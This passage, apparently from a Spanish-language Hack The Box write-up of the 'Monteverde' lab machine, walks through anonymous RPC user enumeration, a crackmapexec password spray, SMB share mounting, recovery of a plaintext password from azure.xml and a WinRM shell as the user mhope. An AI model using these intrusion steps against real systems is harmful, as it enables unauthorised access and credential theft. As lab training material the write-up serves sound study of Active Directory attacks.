-        Description :   Service account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309a
-dfc172d9 running on computer MONTEVERDE.
-        Workstations:      
-        Comment     :                                           
-        Remote Dial :                                           
-        Logon Time               :      sáb, 15 ene 2022 16:53:30 CST
-        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
-        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
-        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      jue, 02 ene 2020 16:53:25 CST
-        Password can change Time :      vie, 03 ene 2020 16:53:25 CST
-        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
-        unknown_2[0..31]...
-        user_rid :      0x450
-        group_rid:      0x201
-        acb_info :      0x00000210
-        fields_present: 0x00ffffff
-        logon_divs:     168
-        bad_password_count:     0x00000000
-        logon_count:    0x0000000a
-        padding1[0..7]...
-        logon_hrs[0..21]...
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x641
-        User Name   :   mhope
-        Full Name   :   Mike Hope
-        Home Drive  :   &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;monteverde&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;mhope
-        Dir Drive   :   H:
-        Profile Path:
-        Logon Script:
-        Description :
-        Workstations:
-        Comment     :
-        Remote Dial :
-        Logon Time               :      vie, 03 ene 2020 07:29:59 CST
-        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
-        Kickoff Time             :      mié, 13 sep 30828 21:48:05 CDT
-        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      jue, 02 ene 2020 17:40:06 CST
-        Password can change Time :      vie, 03 ene 2020 17:40:06 CST
-        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
-        unknown_2[0..31]...
-        user_rid :      0x641
-        group_rid:      0x201
-        acb_info :      0x00000210
-        fields_present: 0x00ffffff
-        logon_divs:     168
-        bad_password_count:     0x00000000
-        logon_count:    0x00000002
-        padding1[0..7]...
-        logon_hrs[0..21]...
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos tres usuarios de los cuales podemos ver la información de dos: &lt;strong&gt;AAD_987d7f2f57d2&lt;/strong&gt; y &lt;strong&gt;mhope&lt;/strong&gt;. Como no tenemos nada más, vamos a extraer todos los usuarios y con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec smb&lt;/code&gt; vamos a validar si dentro de los usuarios podrian ser contraseñas.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\[.*?\]'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[]'&lt;/span&gt;
-Guest
-AAD_987d7f2f57d2
-mhope
-SABatchJobs
-svc-ata
-svc-bexec
-svc-netapp
-dgalanos
-roleary
-smorgan
-❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\[.*?\]'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0x'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[]'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ../content/domainUsers.txt
-❯ crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; domainUsers.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; domainUsers.txt
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:Guest STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:mhope STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:SABatchJobs STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:svc-ata STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:svc-bexec STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:svc-netapp STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:dgalanos STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:roleary STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uest:smorgan STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;AD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:Guest STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:mhope STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:SABatchJobs STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-ata STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-bexec STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-netapp STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:dgalanos STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:roleary STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:smorgan STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:Guest STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:mhope STATUS_LOGON_FAILURE 
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:SABatchJobs
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que tenemos credenciales de un usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SABatchJobs : SABatchJobs&lt;/code&gt;, así que como siempre, vamos a guardarlas y validar que recursos nos aparecen sobre SMB.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SABatchJobs'&lt;/span&gt;
-Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs&lt;span class=&quot;s1&quot;&gt;'s password: 
-
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        azure_uploads   Disk      
-        C$              Disk      Default share
-        E$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
-        users$          Disk      
-SMB1 disabled -- no workgroup available
-❯ smbmap -H 10.10.10.172 -u '&lt;/span&gt;SABatchJobs&lt;span class=&quot;s1&quot;&gt;' -p '&lt;/span&gt;SABatchJobs&lt;span class=&quot;s1&quot;&gt;'
-[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        ADMIN$                                                  NO ACCESS       Remote Admin
-        azure_uploads                                           READ ONLY
-        C$                                                      NO ACCESS       Default share
-        E$                                                      NO ACCESS       Default share
-        IPC$                                                    READ ONLY       Remote IPC
-        NETLOGON                                                READ ONLY       Logon server share 
-        SYSVOL                                                  READ ONLY       Logon server share 
-        users$                                                  READ ONLY
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos varios recursos a los cuales tenemos acceso, podríamos buscar en &lt;strong&gt;SYSVOL&lt;/strong&gt; el archivo &lt;strong&gt;Groups.xml&lt;/strong&gt;; sin embargo, no hay nada. En &lt;strong&gt;azure_uploads&lt;/strong&gt; tampoco vemos nada, así que vamos a &lt;strong&gt;users$&lt;/strong&gt; y crearnos una montura.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/smbmounted
-❯ mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs //10.10.10.172/users&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/mnt/smbmounted/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SABatchJobs,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SABatchJobs,domain&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WORKGROUP,rw
-❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/smbmounted
-❯ tree
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-├── dgalanos
-├── mhope
-│   └── azure.xml
-├── roleary
-└── smorgan
-
-4 directories, 1 file
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;azure.xml&lt;/code&gt;, así que vamos a traerlo a nuestra máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/k4miyo/Documentos/HTB/Monteverde/content
-❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /mnt/smbmounted/mhope/azure.xml &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;azure.xml
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: azure.xml   &amp;lt;UTF-16LE&amp;gt;
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ ﻿&amp;lt;Objs &lt;span class=&quot;nv&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.1.0.1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-   2   │   &amp;lt;Obj &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-   3   │     &amp;lt;TN &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-   4   │       &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
-   5   │       &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
-   6   │     &amp;lt;/TN&amp;gt;
-   7   │     &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
-   8   │     &amp;lt;Props&amp;gt;
-   9   │       &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;StartDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
-  10   │       &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EndDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
-  11   │       &amp;lt;G &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;KeyId&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
-  12   │       &amp;lt;S &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$&amp;lt;&lt;/span&gt;/S&amp;gt;
-  13   │     &amp;lt;/Props&amp;gt;
-  14   │   &amp;lt;/Obj&amp;gt;
-  15   │ &amp;lt;/Objs&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Aqui vemos una contraseña posiblemente asociada al usario &lt;strong&gt;mhope&lt;/strong&gt;, así que vamos a validarla.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mhope'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'4n0therD4y@n0th3r$'&lt;/span&gt;
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:4n0therD4y@n0th3r&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Son válidas las credenciales que tenemos y a parte son de un usuario que se encuentra dentro del grupo &lt;strong&gt;Azure Admins&lt;/strong&gt; que es lo que estábamos buscando. Regresando un poco a la captura que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, vemos que se encuentra abierto el puerto 5985, por lo que podríamos tratar de conectarnos a la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; y las credenciales que tenemos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mhope'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'4n0therD4y@n0th3r$'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;megabank&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;mhope&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora, recordando que dicho usuario se encuentra dentro del grupo de dominio &lt;strong&gt;Azure Admins&lt;/strong&gt;, vamos a echarle un ojo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; net user mhope
-User name                    mhope
-Full Name                    Mike Hope
-Comment
-User&lt;span class=&quot;s1&quot;&gt;'s comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            1/2/2020 3:40:05 PM
-Password expires             Never
-Password changeable          1/3/2020 3:40:05 PM
-Password required            Yes
-User may change password     No
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory               \\monteverde\users$\mhope
-Last logon                   1/15/2022 5:57:03 PM
-
-Logon hours allowed          All
-
-Local Group Memberships      *Remote Management Use
-Global Group memberships     *Azure Admins         *Domain Users
-The command completed successfully.
-
-*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
-*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt; net group &quot;Azure Admins&quot;
-Group name     Azure Admins
-Comment
-
-Members
-
--------------------------------------------------------------------------------
-AAD_987d7f2f57d2         Administrator            mhope
-The command completed successfully.
-
-*Evil-WinRM* PS C:\Users\mhope\Documents&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que el otro usuario que no podíamos ver que se encuentra dentro de dicho grupo es &lt;strong&gt;Administrator&lt;/strong&gt;, vamos a echarle un ojo.&lt;/p&gt;
